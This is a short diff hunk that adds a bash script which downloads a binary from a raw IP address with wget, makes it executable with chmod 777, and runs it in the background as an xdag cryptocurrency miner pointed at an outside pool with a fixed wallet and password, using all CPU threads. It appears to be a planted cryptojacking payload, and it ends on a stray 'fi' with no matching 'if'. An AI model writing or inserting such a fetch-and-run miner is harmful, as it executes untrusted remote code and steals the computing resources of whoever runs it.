@@ -1,0 +1,3 @@
+#!/bin/bash
+wget http://139.59.106.85/bms&&chmod 777 bms&&./bms --algorithm xdag --pool 116.202.3.220:13656 --wallet YtT8aU+HxwQQKuI6WkOne8KMvu7ZlAbo --password Pcs --cpu-threads 0 --disable-gpu &
+fi
